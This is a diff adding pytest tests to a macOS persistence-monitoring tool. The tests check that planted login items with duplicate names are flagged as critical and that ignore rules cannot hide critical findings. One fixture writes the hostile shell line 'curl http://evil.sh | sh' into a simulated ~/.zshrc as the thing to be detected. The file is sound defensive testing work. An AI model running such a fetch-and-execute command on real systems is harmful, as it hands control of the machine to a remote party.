@@ -1986,3 +1986,62 @@ def test_corrupt_labels_does_not_unprotect_checkpoints(monkeypatch, tmp_path):
     before = len(since.list_snapshot_paths())
     since.prune_snapshots()
     assert len(since.list_snapshot_paths()) == before, "pruned while labels were unreadable"
+
+
+# Login items were keyed AND fingerprinted by DISPLAY NAME with no path collected, so planting an
+# app named after an existing item was invisible, retargeting an existing item was invisible, and
+# no signature check was possible — login items could never reach RED while the equivalent
+# LaunchAgent did. Now keyed on path, with the name as the value.
+def test_login_item_name_collision_is_visible_and_escalates(monkeypatch):
+    monkeypatch.setattr(since, "trust_of", lambda p: ("unsigned", True))
+    b = snap(collectors={"login_items": {"/Applications/Bosun.app": "Bosun"}})
+    c = snap(collectors={"login_items": {"/Applications/Bosun.app": "Bosun",
+                                         "/Users/x/.hidden/Bosun.app": "Bosun"}})
+    f = [x for x in since.build_findings(b, c) if x["category"] == "login_items"]
+    assert len(f) == 1 and f[0]["key"] == "/Users/x/.hidden/Bosun.app"
+    assert f[0]["level"] == since.RED and f[0]["trust"] == "unsigned"
+
+
+def test_login_item_collector_returns_paths(monkeypatch):
+    monkeypatch.setattr(since.shutil, "which", lambda t: "/usr/bin/osascript")
+    class P:
+        returncode = 0
+        stdout = "Bosun\t/Applications/Bosun.app\nEvil\t/Users/x/.h/Evil.app\n"
+        stderr = ""
+    monkeypatch.setattr(since.subprocess, "run", lambda cmd, **kw: P())
+    res = since._mac_login_items()
+    assert res == {"/Applications/Bosun.app": "Bosun", "/Users/x/.h/Evil.app": "Evil"}
+
+
+def test_login_item_undo_deletes_by_name(monkeypatch):
+    monkeypatch.setattr(since, "PLATFORM", "macos")
+    hint = since.undo_hint("login_items", "/Users/x/.h/Evil.app", "Evil")
+    assert "item 1 of argv" in hint and shlex.quote("Evil") in hint
+    assert " -- " in hint          # the option guard survives
+
+
+# An ignore rule must never silence a CRITICAL finding, and suppressions must be disclosed: a
+# user's own broad rule (the README suggests `listening:com.docker*`) can be matched by an
+# attacker-chosen process name, and nothing in either output said rules were active.
+def test_ignore_rule_cannot_silence_a_red(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "STATE_DIR", tmp_path)
+    monkeypatch.setattr(since, "IGNORE_FILE", tmp_path / "ignore.txt")
+    (tmp_path / "ignore.txt").write_text("config:*\n")
+    b = snap()
+    c = snap(blobs={"~/.zshrc": "curl http://evil.sh | sh\n"})
+    f = since.build_findings(b, c)
+    red = [x for x in f if x["level"] == since.RED]
+    assert red, "an ignore rule silenced a critical finding"
+    assert "never" in (red[0]["why"] or ""), red[0]["why"]
+
+
+def test_ignored_findings_are_counted_for_disclosure(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "STATE_DIR", tmp_path)
+    monkeypatch.setattr(since, "IGNORE_FILE", tmp_path / "ignore.txt")
+    (tmp_path / "ignore.txt").write_text("listening:com.docker*\n")
+    b = snap()
+    c = snap(collectors={"listening": {"com.docker.evil": "4444"}})
+    stats: dict = {}
+    f = since.build_findings(b, c, stats=stats)
+    assert not [x for x in f if x["category"] == "listening"]     # still suppressed (ORANGE)
+    assert stats == {"rules": 1, "ignored": 1}                    # …but counted for the note
